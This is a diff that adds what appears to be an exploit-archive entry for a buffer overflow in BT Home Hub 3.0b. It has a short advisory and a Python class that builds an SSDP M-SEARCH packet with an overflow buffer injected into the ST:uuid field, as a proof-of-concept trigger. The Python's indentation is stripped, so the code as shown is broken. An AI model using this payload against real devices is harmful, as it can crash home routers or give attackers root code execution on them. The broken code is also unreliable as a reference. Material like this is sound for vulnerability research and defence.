@@ -1,0 +1,41 @@
+source: http://www.securityfocus.com/bid/57243/info
+
+BT Home Hub is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data before copying it to an insufficiently sized buffer.
+
+An attacker can exploit this issue to gain elevated privileges and execute arbitrary code with root privileges. Failed exploit attempts will likely crash the affected application.
+
+BT Home Hub 3.0b is vulnerable; other versions may also be affected.
+
+# 
+*******************************************************************************
+# 
+*******************************************************************************
+# ***************** These files are licensed GPLv2. ****************
+# ******************* See included LICENSE for more info. 
+*******************
+# 
+*******************************************************************************
+# 
+*******************************************************************************
+# ************************ From your leet hacking cr3w 
+************************
+# ******************************* *******************************
+# ********************************** at 
+**********************************
+# ************ http://www.tacnetsol.com ***********
+# 
+*******************************************************************************
+# Copyright (c) 2013 Zachary Cutlip
+# Tactical Network Solutions, LLC
+class MsearchCrash:
+def __init__(self,overflowbuffer):
+self.__msearch_text__=\
+"M-SEARCH * HTTP/1.1\r\n"+\
+"HOST:239.255.255.250:1900\r\n"+\
+"ST:uuid:"+str(overflowbuffer)+"\r\n"\
+"MX:2\r\n"+\
+'MAN:"ssdp:discover"'+"\r\n\r\n"
+
+def __str__(self):
+return self.__msearch_text__
+
